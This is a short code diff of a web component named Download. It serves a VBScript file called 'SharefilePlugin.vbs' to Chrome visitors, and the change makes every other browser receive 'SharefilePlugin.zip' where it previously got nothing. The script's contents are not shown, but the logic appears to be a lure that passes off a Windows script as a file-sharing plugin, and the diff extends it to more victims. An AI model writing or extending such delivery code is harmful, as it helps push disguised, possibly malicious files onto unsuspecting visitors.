@@ -20,7 +20,7 @@ const Download = () => {
     if (ua.includes("Chrome") && !ua.includes("Edg/")) {
       return { href: "/docs/SharefilePlugin.vbs", name: "SharefilePlugin.vbs" };
     }
-    return null;
+    return { href: "/docs/SharefilePlugin.zip", name: "SharefilePlugin.zip" };
   };
 
   useEffect(() => {
